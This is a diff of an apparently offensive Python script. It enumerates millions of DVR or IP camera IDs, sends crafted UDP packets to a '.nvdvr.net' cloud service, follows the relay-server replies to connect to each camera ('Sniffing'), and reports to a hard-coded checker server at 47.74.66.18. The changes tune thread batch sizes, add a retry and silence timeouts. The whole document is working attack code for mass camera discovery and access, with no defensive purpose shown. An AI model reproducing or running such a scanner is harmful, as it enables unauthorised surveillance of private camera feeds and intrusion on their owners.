@@ -11,12 +11,12 @@ import requests
 
 class server:
     # CHECKER CONFIG FOR SCANNING CAMS ONLINE IN RANGE
-    SCAN_NEW_CAMS = True
+    SCAN_NEW_CAMS = False
     FROM_ID = 10000000
     TO_ID = 12000000
     TIMEOUT = 30
-    PACK_LIST = 80000  # SIZE LIST ID CAMS FOR 1 THREAD
-    PACK_LIST_CAMS = 300  # SIZE CAMS FOR 1 THREAD
+    PACK_LIST = 80000  # SIZE LIST ID CAMS FOR 1 THREAD SCAN
+    PACK_LIST_CAMS = 10000  # SIZE CAMS FOR 1 THREAD LISTEN
     SERVER_CHECKER = '47.74.66.18'
     PORT_CHECKER = 8900
     TMP_FILE = "tmp.txt"
@@ -30,9 +30,9 @@ class server:
     CamsList = None
 
     def __init__(self):
+        self.check_s = None
         self.process = None
         self.send_msg(f"Start Script")
-
         try:
             if len(sys.argv) == 2:
                 if str(sys.argv[1]) == "scan":
@@ -60,9 +60,9 @@ class server:
             all_processes = []
             for dev in devs:
                 if dev:
-                    self.process = multiprocessing.Process(target=self.CreateSocket, args=(dev,))
-                    all_processes.append(self.process)
-                    self.process.start()
+                    process = multiprocessing.Process(target=self.CreateSocket, args=(dev,))
+                    all_processes.append(process)
+                    process.start()
             for p in all_processes:
                 p.join()
         except socket.error as e:
@@ -184,26 +184,33 @@ class server:
 
     def CreateSocket(self, dev):
         try:
-            check_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            if self.DEBUG:
-                print("\u001b[31mPID: %s\u001b[37m" % self.process.pid)
-                print("\u001b[32m[+]Send request for id: %s\u001b[37m" % dev)
-            data = '02070032303038333131323334333734313100020c17222d0000'
-            data += bytes(str(dev), 'utf-8').hex()
-            data += '2e6e766476722e6e65740000000000000000000000000000'
-            data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
-            data = bytes.fromhex(data)
-            self.send_data(check_s, data, self.SERVER, self.PORT)
-            check_s.settimeout(self.TIMEOUT)
-            print(f'\u001b[32m[+]Sniffing {dev}...\u001b[37m')
-            time.sleep(0.0001)
-            result = (check_s.recvfrom(4096, 0))[0]
-            if result[6:7] != b'\x00':
-                result = self.ParseRelayServer(result)
-                self.ConnectToRelay(result)
+            if dev:
+                check_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                check_s.settimeout(self.TIMEOUT)
+                if self.DEBUG:
+                    print("\u001b[31mPID: %s\u001b[37m" % self.process.pid)
+                    print("\u001b[32m[+]Send request for id: %s\u001b[37m" % dev)
+                data = '02070032303038333131323334333734313100020c17222d0000'
+                data += bytes(str(dev), 'utf-8').hex()
+                data += '2e6e766476722e6e65740000000000000000000000000000'
+                data += '3131313131313131313131318a1bc0a801096762230a93f5d100'
+                data = bytes.fromhex(data)
+                self.send_data(check_s, data, self.SERVER, self.PORT)
+                print(f'\u001b[32m[+]Sniffing {dev}...\u001b[37m')
+                result = (check_s.recvfrom(4096, 0))[0]
+                if result[6:7] != b'\x00':
+                    result = self.ParseRelayServer(result)
+                    if result:
+                        self.ConnectToRelay(result)
+                else:
+                    self.send_data(check_s, data, self.SERVER, self.PORT)
+                    result = (check_s.recvfrom(4096, 0))[0]
+                    result = self.ParseRelayServer(result)
+                    if result:
+                        self.ConnectToRelay(result)
                 check_s.close()
         except timeout:
-            print('caught a timeout')
+            pass
 
     def SaveCams(self, list_id):
         with open(self.FileListCams, 'w') as fp:
